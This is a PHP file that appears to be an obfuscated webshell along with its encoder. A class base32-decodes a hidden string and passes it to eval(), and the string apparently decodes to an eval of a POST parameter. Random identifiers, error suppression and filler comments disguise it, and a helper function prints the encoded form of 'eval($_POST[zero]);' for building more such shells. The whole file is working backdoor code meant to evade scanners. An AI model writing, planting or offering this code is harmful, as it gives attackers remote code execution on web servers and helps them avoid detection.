<?php
class jeLFs{
        public $mkaNu = null;
        public $Nwzhw = null;
        function __construct(){
        $this->mkaNu = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->Nwzhw = @VpIvK($this->mkaNu);
        $Nwzhw= $this->Nwzhw;
        @eval("/****iDFCJa****iDFCJa****/".$Nwzhw."/****iDFCJa****/");
        }}
new jeLFs();
function VpIvK($VRKrD){
    $pLNQv = '';
    $rmjLK = 0;
    $GSwuy = 0;
    for ($i = 0, $j = strlen($VRKrD); $i < $j; $i++){
        $rmjLK <<= 5;
        if ($VRKrD[$i] >= 'a' && $VRKrD[$i] <= 'z'){
            $rmjLK += (ord($VRKrD[$i]) - 97);
        } elseif ($VRKrD[$i] >= '2' && $VRKrD[$i] <= '7') {
            $rmjLK += (24 + $VRKrD[$i]);
        } else {
            exit(1);
        }
        $GSwuy += 5;
        while ($GSwuy >= 8){
            $GSwuy -= 8;
            $pLNQv .= chr($rmjLK >> $GSwuy);
            $rmjLK &= ((1 << $GSwuy) - 1);}}
    return $pLNQv;}
function encoding($str){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $t = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($str); $i < $j; $i++){
    $v <<= 8;
        $v += ord($str[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $t .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $t .= $BASE32_ALPHABET[$v];}
    return $t;}
print(encoding('eval($_POST[zero]);'));
?>

